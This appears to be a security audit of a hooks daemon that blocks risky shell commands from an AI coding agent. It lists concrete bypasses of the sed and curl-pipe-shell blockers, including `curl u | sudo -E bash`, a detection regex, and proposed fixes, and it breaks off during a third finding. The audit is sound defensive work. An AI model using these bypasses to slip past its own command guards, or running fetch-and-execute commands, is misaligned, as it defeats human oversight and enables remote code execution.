## 1. [CRITICAL] `src/claude_code_hooks_daemon/handlers/pre_tool_use/sed_blocker.py` :209-216

- **Dimension:** false-negative
- **Claim:** _is_safe_readonly_command returns True for the ENTIRE command as soon as a grep token appears anywhere, with the only exception being the narrow `| xargs ... sed` shape. So a destructive in-place sed chained after (or before) a grep bypasses the block entirely. Verified: `grep foo bar.txt; sed -i 's/x/y/' f.py` and `grep -q x f && sed -i 's/a/b/' f.py` are both ALLOWED. This is the exact mass-destruction scenario the handler exists to prevent.
- **Proposed fix:** Do not whitelist the whole command on the mere presence of grep. Instead detect actual sed *execution* (sed with -i/-e/-n flags or an s/// program as a command head, including after `;`/`&&`/`||`/`|xargs`) and block that, regardless of any grep elsewhere. Only treat sed as safe when it is purely a stdout-transforming stage in a read-only pipeline.

## 2. [HIGH] `src/claude_code_hooks_daemon/handlers/pre_tool_use/curl_pipe_shell.py` :77

- **Dimension:** false-negative
- **Claim:** Pattern `\b(curl|wget)\b.*\|\s*(sudo\s+)?(bash|sh)\b` only allows an optional bare `sudo` directly before bash/sh. Verified: `curl u | sudo -E bash` is ALLOWED because the `-E` flag sits between `sudo` and `bash`. Also misses other shells (`zsh`, `python`) — `wget u | zsh` ALLOWED — which can equally execute fetched code. A trivial `sudo -E`/`sudo -H` variant defeats this safety-critical RCE blocker.
- **Proposed fix:** Allow arbitrary sudo flags before the interpreter (`sudo(\s+-\S+)*\s+`) and broaden the interpreter set beyond bash/sh (zsh, ksh, dash, python, perl, ruby) since the danger is piping network content to any interpreter.

## 3. [HIGH] `src/claude_code_hooks_daemon/handlers/stop/auto_continue_stop.py` :163-176, 337-338

- **Claim:** _QA_FAILURE_INDICATORS contains substrings that match SUCCESSFUL QA output.
